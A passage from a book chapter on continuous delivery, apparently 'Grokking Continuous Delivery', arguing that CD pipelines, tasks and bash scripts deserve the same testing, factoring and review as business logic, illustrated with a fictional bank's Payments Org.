-  *They are hard to debug.* Each failure is clearly associated with a specific task, any bash in the task is minimal, and complex logic is supported by well-written tools and libraries that report meaningful errors
-  *They are hard to read.* Each task has minimal bash, and when libraries and tools are used, the source code is well factored and supported by tests, making it much easier to understand what is happening.
-  *Engineers are hesitant to make changes to them.* The logic implemented in bash isn’t complex, and if the complexity needs to grow, the groundwork is laid for converting that logic to Python libraries and tools. The existing tools and libraries are supported with tests, and code review is now much easier.

These pipelines have gone from being *hard to use* and *hard to maintain* to being just as easy to use and maintain as the rest of their software.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)CD scripts are code, too

[](/book/grokking-continuous-delivery/chapter-12/)One way[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) to look at why Purrfect Bank’s Payments Org ended up in this situation is that the engineers didn’t treat their CD code the same way they treated the rest of their code. The business logic implemented in their Transaction and Credit Card Integration services followed best practices: it was well factored, tested, reviewed, and versioned. But when it came to the code they were relying on for their CD pipelines and tasks, they applied a different standard. They focused on just getting it to work and didn’t go much further than that.

Just as with any other code, this approach can feel fast at first but starts to break down as more complexity is added and maintainability problems start to slow everything down. Remember the definition of CI:

**The process of combining code changes frequently, with each change verified when it is added to the already accumulated and verified changes**.

In chapter 3, you saw how this applies to *all the plain-text data that makes up your software—*including the configuration. The final missing piece of the complete config-as-code story is to realize that *the code that defines how you integrate and deliver your software is also part of the software itself.*

Lorenzo and Purrfect Bank learned an important lesson:

-  Business logic is code.
-  Tests are code.
-  Configuration is code.
-  *CD pipelines**, tasks, and scripts are also code.*

#####  Takeaway

Code is code. Apply the same best practices you’d apply to your business logic to all the code you write.

#####  Takeaway

Practice “as code” (e.g., config as code, pipelines as code) for all your code, including your CD tasks, pipelines, and scripts.

## [](/book/grokking-continuous-delivery/chapter-12/)Conclusion

[](/book/grokking-continuous-delivery/chapter-12/)Bash had initially worked well for the teams in Purrfect Bank’s Payments Org when they started to create their CD pipelines. But at a certain inflection point, bash stops being a good choice, and the teams had continued using bash anyway. This resulted in CD pipelines that were hard to maintain and use, and the teams were starting to wonder if they were getting any value from them at all.

Lorenzo was able to get these CD pipelines back into a good state by breaking up large bash scripts into well-factored discrete tasks, and by breaking their dependence on large sprawling bash libraries. Much of the logic stayed in bash, but it was now also defined in well-factored, versioned tasks, and the more complex logic was converted to Python tools and libraries, supported by tests.

## [](/book/grokking-continuous-delivery/chapter-12/)Summary

-  Tasks that do too many things do not give good signals.
-  Good task design is a lot like good function design. Well-written tasks are highly cohesive, loosely coupled, have well-defined interfaces, and do just the right amount.
-  Shell scripting languages like bash excel at connecting input and output from multiple programs, but general-purpose languages are better at handling more complex logic in a way that is maintainable.
-  Code is code! Apply the same best practices you’d apply to the code defining your business logic to all the code you write.
-  CD pipeline code is part of the code that defines your software.

## [](/book/grokking-continuous-delivery/chapter-12/)Up next . . .

In the final chapter, I’ll show the various ways that tasks within a pipeline can be organized, and the features you’ll need in a CD system to create the most effective pipelines.
